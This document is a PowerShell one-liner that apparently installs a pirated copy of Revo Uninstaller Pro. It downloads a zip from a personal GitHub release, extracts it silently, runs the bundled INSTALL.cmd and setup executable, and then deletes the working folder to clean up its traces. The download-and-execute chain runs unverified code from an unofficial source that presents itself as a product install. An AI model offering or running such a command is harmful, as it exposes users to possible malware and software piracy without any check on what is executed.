$p="C:\phwyverysad"; $z="$p\revo.zip"; $t="$p\temp"; $u="https://github.com/phwyverysad/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/revo_uninstaller_pro.zip"; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $oldP=$ProgressPreference; $ProgressPreference='SilentlyContinue'; if(!(Test-Path $p)){New-Item $p -Type Directory | Out-Null}; try{Write-Host "Downloading..."; (New-Object System.Net.WebClient).DownloadFile($u,$z); if(Test-Path $z){Write-Host "Extracting..."; Expand-Archive $z $t -Force; "INSTALL.cmd","RevoUninProSetup.exe","License" | %{if(Test-Path "$t\$_"){Move-Item "$t\$_" $p -Force}}; Remove-Item $z,$t -Recurse -EA 0; $c="$p\INSTALL.cmd"; if(Test-Path $c){Write-Host "Installing..."; Start-Process $c -WorkingDirectory $p -Wait}}}catch{Write-Host "Error: $_"}finally{Write-Host "Cleaning up..."; Start-Sleep -Seconds 3; if(Test-Path $p){Remove-Item $p -Recurse -Force -EA 0}; $ProgressPreference=$oldP; Write-Host "Done."}